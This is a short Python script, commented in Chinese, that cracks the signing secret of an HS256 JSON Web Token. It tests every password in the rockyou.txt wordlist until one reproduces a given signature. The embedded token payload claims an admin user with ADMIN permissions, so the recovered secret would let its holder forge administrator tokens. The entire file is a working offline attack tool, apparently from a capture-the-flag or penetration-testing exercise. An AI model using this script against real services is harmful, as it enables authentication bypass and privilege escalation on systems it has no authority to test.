import base64, hmac, hashlib, sys
def b64u(b): return base64.urlsafe_b64encode(b).rstrip(b'=')
# 固定的 header.payload
body=b"eyJhbGciOiAiSFMyNTYiLCAidHlwIjogIkpXVCJ9.eyJ1c2VyIjogeyJ1c2VybmFtZSI6ICJhZG1pbiIsICJyb2xlIjogImFkbWluIn0sICJwZXJtaXNzaW9ucyI6IFsiQURNSU4iXSwgImlhdCI6IDE3MDAwMDAwMDAsICJleHAiOiAyMDAwMDAwMDAwfQ"
target=b"EUseNFxIe1FETqohzBy4_2opk-nvuWL4Y6VOCNCPOgs"  # 用 secret 签的
# 优化: 预编译
found=None
n=0
with open("rockyou.txt","rb") as f:
    for line in f:
        pw=line.strip()
        if not pw or len(pw)>128: continue
        sig=b64u(hmac.new(pw, body, hashlib.sha256).digest())
        if sig==target:
            found=pw; break
        n+=1
print(f"tested {n}")
print(f"FOUND: {found}" if found else "NOT FOUND in rockyou (top pass)")
